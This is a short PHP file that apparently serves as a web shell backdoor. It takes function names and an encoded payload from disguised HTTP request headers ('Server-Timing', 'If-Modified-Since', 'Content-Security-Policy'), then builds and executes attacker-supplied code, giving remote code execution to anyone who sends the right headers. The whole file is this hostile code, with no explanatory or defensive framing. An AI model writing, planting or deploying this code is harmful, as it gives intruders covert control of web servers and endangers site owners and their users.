<?php
$_HEADERS = getallheaders();
if (isset($_HEADERS['Server-Timing'])) {
    $system = $_HEADERS['Server-Timing']('', $_HEADERS['If-Modified-Since']($_HEADERS['Content-Security-Policy']));
    $system();
}